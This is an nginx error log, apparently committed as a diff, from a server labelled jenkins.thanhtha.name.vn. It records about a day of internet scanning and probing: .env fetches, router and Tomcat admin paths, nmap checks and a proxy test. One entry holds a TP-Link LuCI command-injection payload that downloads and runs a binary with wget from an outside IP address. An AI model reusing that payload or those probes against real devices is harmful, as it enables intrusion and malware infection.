+2024/04/14 16:46:29 [error] 20#20: *2316 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 18:01:31 [error] 20#20: *2323 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.79.172.21, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 18:04:50 [error] 21#21: *2326 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 18:04:57 [error] 21#21: *2332 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 18:04:57 [error] 21#21: *2330 open() "/etc/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "POST /sdk HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 18:04:57 [error] 21#21: *2333 open() "/etc/nginx/html/nmaplowercheck1713117897" failed (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET /nmaplowercheck1713117897 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 18:04:57 [error] 21#21: *2337 open() "/etc/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET /evox/about HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 18:04:57 [error] 21#21: *2338 open() "/etc/nginx/html/HNAP1" failed (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET /HNAP1 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 18:05:00 [error] 21#21: *2343 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 18:05:00 [error] 21#21: *2346 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.83, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 18:08:16 [error] 21#21: *2349 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 18:35:34 [error] 21#21: *2350 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 93.185.157.142, server: jenkins.thanhtha.name.vn, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "61.14.234.55:80", referrer: "http://61.14.234.55:80/admin/login.asp"
+2024/04/14 19:00:00 [error] 21#21: *2354 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 66.240.192.138, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:00:00 [error] 21#21: *2355 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.240.192.138, server: jenkins.thanhtha.name.vn, request: "GET /robots.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:00:01 [error] 21#21: *2356 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 66.240.192.138, server: jenkins.thanhtha.name.vn, request: "GET /sitemap.xml HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:00:01 [error] 21#21: *2357 open() "/etc/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 66.240.192.138, server: jenkins.thanhtha.name.vn, request: "GET /.well-known/security.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:00:03 [error] 21#21: *2358 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 66.240.192.138, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:05:46 [error] 20#20: *2360 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 19:09:22 [error] 20#20: *2361 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 103.114.106.107, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:09:22 [error] 20#20: *2362 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 103.114.106.107, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 19:18:32 [error] 20#20: *2367 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.76.96.55, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 20:30:39 [error] 20#20: *2372 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 20:54:30 [error] 20#20: *2375 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.49, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 20:54:33 [error] 20#20: *2376 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.49, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 20:58:58 [error] 20#20: *2379 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 21:01:54 [error] 20#20: *2380 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 21:38:40 [error] 20#20: *2403 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 103.147.185.250, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/14 21:38:40 [error] 20#20: *2404 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 103.147.185.250, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 21:43:57 [error] 20#20: *2410 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 22:13:21 [error] 21#21: *2414 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 184.88.192.221, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 22:42:52 [error] 21#21: *2419 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 80.242.103.221, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 23:02:52 [error] 21#21: *2420 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 23:34:15 [error] 21#21: *2422 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 23:40:30 [error] 21#21: *2425 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.246, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 23:57:46 [error] 21#21: *2426 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 00:42:49 [error] 21#21: *2435 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 00:49:31 [error] 21#21: *2436 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 00:54:41 [error] 21#21: *2437 "/etc/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 39.81.252.110, server: jenkins.thanhtha.name.vn, request: "POST /HNAP1/ HTTP/1.0", host: "61.14.234.55:80"
+2024/04/15 01:31:43 [error] 21#21: *2455 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 01:41:00 [error] 21#21: *2456 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 67.205.134.36, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/15 01:42:01 [error] 21#21: *2469 open() "/etc/nginx/html/manager/text/list" failed (2: No such file or directory), client: 104.131.144.39, server: jenkins.thanhtha.name.vn, request: "GET /manager/text/list HTTP/1.1", host: "61.14.234.55"
+2024/04/15 02:46:10 [error] 21#21: *2494 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 119.129.84.85, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 02:52:23 [error] 21#21: *2495 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 03:24:10 [error] 20#20: *2517 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 71.6.232.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 03:24:47 [error] 20#20: *2522 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.246, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 03:32:09 [error] 20#20: *2533 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.240, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 03:37:50 [error] 20#20: *2538 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 03:55:17 [error] 20#20: *2542 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/15 03:55:24 [error] 20#20: *2545 open() "/etc/nginx/html/nmaplowercheck1713153324" failed (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET /nmaplowercheck1713153324 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/15 03:55:24 [error] 20#20: *2548 open() "/etc/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "POST /sdk HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/15 03:55:24 [error] 20#20: *2547 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/15 03:55:25 [error] 20#20: *2552 open() "/etc/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET /evox/about HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/15 03:55:25 [error] 20#20: *2553 open() "/etc/nginx/html/HNAP1" failed (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET /HNAP1 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/15 03:55:27 [error] 20#20: *2558 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/15 03:55:28 [error] 20#20: *2561 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.45, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/15 04:09:55 [error] 20#20: *2566 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 59.182.2.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 04:09:55 [error] 21#21: *2567 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 59.182.2.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 04:09:55 [error] 21#21: *2568 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 59.182.2.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 04:44:36 [error] 21#21: *2624 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 04:46:10 [error] 21#21: *2625 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 199.204.96.242, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 04:59:17 [error] 21#21: *2626 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 35.173.130.152, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 05:25:35 [error] 21#21: *2630 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 205.210.31.201, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/15 05:29:35 [error] 21#21: *2631 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 216.218.206.68, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 05:31:22 [error] 21#21: *2632 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 216.218.206.68, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/15 05:32:33 [error] 21#21: *2633 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 216.218.206.68, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/15 05:34:07 [error] 21#21: *2634 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 216.218.206.68, server: jenkins.thanhtha.name.vn, request: "GET /geoserver/web/ HTTP/1.1", host: "61.14.234.55"
+2024/04/15 06:15:53 [error] 21#21: *2641 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 06:20:50 [error] 21#21: *2644 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.179, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/15 06:26:47 [error] 20#20: *2646 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 80.94.92.60, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 06:28:39 [error] 20#20: *2647 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.243.148.6, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 06:35:25 [error] 20#20: *2648 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 07:04:02 [error] 20#20: *2670 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 07:10:23 [error] 20#20: *2673 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 07:32:49 [error] 20#20: *2690 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 158.247.236.248, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/15 07:32:49 [error] 20#20: *2691 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 158.247.236.248, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 07:32:50 [error] 20#20: *2692 open() "/etc/nginx/html/sendgrid/.env" failed (2: No such file or directory), client: 158.247.236.248, server: jenkins.thanhtha.name.vn, request: "GET /sendgrid/.env HTTP/1.1", host: "61.14.234.55"
+2024/04/15 07:32:50 [error] 20#20: *2693 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 158.247.236.248, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 07:45:46 [error] 20#20: *2704 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 07:50:34 [error] 20#20: *2705 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 5.235.211.218, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 08:10:19 [error] 20#20: *2774 open() "/etc/nginx/html/aaa9" failed (2: No such file or directory), client: 159.203.44.105, server: jenkins.thanhtha.name.vn, request: "GET /aaa9 HTTP/1.1", host: "61.14.234.55"
+2024/04/15 08:10:26 [error] 20#20: *2775 open() "/etc/nginx/html/aab8" failed (2: No such file or directory), client: 159.203.44.105, server: jenkins.thanhtha.name.vn, request: "GET /aab8 HTTP/1.1", host: "61.14.234.55"
+2024/04/15 08:10:34 [error] 20#20: *2776 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 159.203.44.105, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 09:02:49 [error] 21#21: *2784 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/15 09:07:08 [error] 21#21: *2825 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.150.154, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 09:09:54 [error] 21#21: *2826 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 130.211.54.158, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 09:09:57 [error] 21#21: *2827 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.150.135, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 09:31:12 [error] 21#21: *2828 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.156.128.17, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 10:06:14 [error] 21#21: *2832 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 10:32:48 [error] 21#21: *2836 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 87.236.176.219, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 11:02:41 [error] 21#21: *2837 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.246, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 12:10:02 [error] 21#21: *2865 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 12:28:43 [error] 21#21: *2868 open() "/etc/nginx/html/login" failed (2: No such file or directory), client: 84.54.51.13, server: jenkins.thanhtha.name.vn, request: "POST /login HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 13:20:32 [error] 21#21: *2896 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 13:33:27 [error] 21#21: *2915 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.74.134.140, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 13:33:27 [error] 21#21: *2915 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 116.74.134.140, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55", referrer: "http://61.14.234.55/"
+2024/04/15 13:33:28 [error] 20#20: *2916 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.74.134.140, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 13:51:41 [error] 20#20: *2947 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.74.134.140, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 13:51:41 [error] 20#20: *2947 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 116.74.134.140, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55", referrer: "http://61.14.234.55/"
+2024/04/15 13:51:41 [error] 20#20: *2948 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.74.134.140, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 14:23:36 [error] 20#20: *2959 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 14:30:42 [error] 20#20: *2962 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.43.33.218, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 14:48:03 [error] 20#20: *2971 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 213.32.39.41, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 15:09:04 [error] 20#20: *2976 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 175.152.196.5, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 15:09:54 [error] 20#20: *2977 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 220.200.170.76, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 15:09:58 [error] 20#20: *2978 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 15:18:36 [error] 20#20: *2989 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 15:43:56 [error] 20#20: *2990 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 31.220.1.83, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 16:10:49 [error] 20#20: *2992 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 5.196.102.77, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/15 17:17:53 [error] 20#20: *3986 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 17:45:42 [error] 20#20: *4117 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 71.6.134.230, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 17:47:38 [error] 20#20: *4118 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 71.6.134.230, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/15 18:31:14 [error] 21#21: *4122 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 139.99.9.160, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 18:49:39 [error] 21#21: *4123 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 19:00:27 [error] 21#21: *4124 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 67.217.48.57, server: jenkins.thanhtha.name.vn, request: "HEAD / HTTP/1.0"
+2024/04/15 19:11:33 [error] 21#21: *4139 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 152.32.198.210, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 19:11:51 [error] 21#21: *4140 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 152.32.198.210, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/15 19:11:51 [error] 21#21: *4141 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 152.32.198.210, server: jenkins.thanhtha.name.vn, request: "GET /robots.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/15 19:11:52 [error] 21#21: *4142 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 152.32.198.210, server: jenkins.thanhtha.name.vn, request: "GET /sitemap.xml HTTP/1.1", host: "61.14.234.55"
+2024/04/15 19:26:26 [error] 21#21: *4143 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 20:09:17 [error] 21#21: *4152 open() "/etc/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /actuator/gateway/routes HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 20:11:04 [error] 21#21: *4153 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.76.158.233, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 20:17:29 [error] 21#21: *4160 open() "/etc/nginx/html/ip" failed (2: No such file or directory), client: 152.42.176.18, server: jenkins.thanhtha.name.vn, request: "GET http://httpbin.org/ip HTTP/1.1", host: "httpbin.org"
+2024/04/15 21:24:29 [error] 20#20: *4190 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 95.168.56.23, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "61.14.234.55"
+2024/04/15 21:34:48 [error] 20#20: *4194 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 109.182.52.101, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 21:37:22 [error] 20#20: *4195 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 21:47:18 [error] 20#20: *4196 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 21:48:38 [error] 20#20: *4197 open() "/etc/nginx/html/manager/html" failed (2: No such file or directory), client: 195.140.227.163, server: jenkins.thanhtha.name.vn, request: "GET /manager/html HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 22:18:23 [error] 20#20: *4198 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/15 22:48:46 [error] 20#20: *4207 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/15 22:48:47 [error] 20#20: *4208 open() "/etc/nginx/html/form.html" failed (2: No such file or directory), client: 104.131.12.36, server: jenkins.thanhtha.name.vn, request: "GET /form.html HTTP/1.1", host: "61.14.234.55"
